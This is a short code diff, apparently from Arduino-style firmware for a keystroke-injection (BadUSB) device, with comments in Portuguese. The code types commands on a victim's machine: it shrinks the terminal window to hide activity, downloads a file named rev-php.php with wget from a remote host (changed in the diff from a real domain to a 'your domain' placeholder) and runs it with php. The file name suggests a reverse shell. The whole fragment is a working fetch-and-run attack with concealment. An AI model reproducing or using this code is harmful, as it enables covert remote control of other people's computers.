@@ -33,7 +33,7 @@ void executeScript() {
     typeString("printf '\e[8;1;1t' && printf '\e[3;1920;1080t'");
 
     // Baixar o arquivo para /tmp
-    typeString("wget -O /tmp/rev-php.php https://zer0.pw/rev-php.php\n");
+    typeString("wget -O /tmp/rev-php.php https://"SEU-DOMINIO"/rev-php.php\n");
 
     // Executar o arquivo baixado
     typeString("php /tmp/rev-php.php\n");
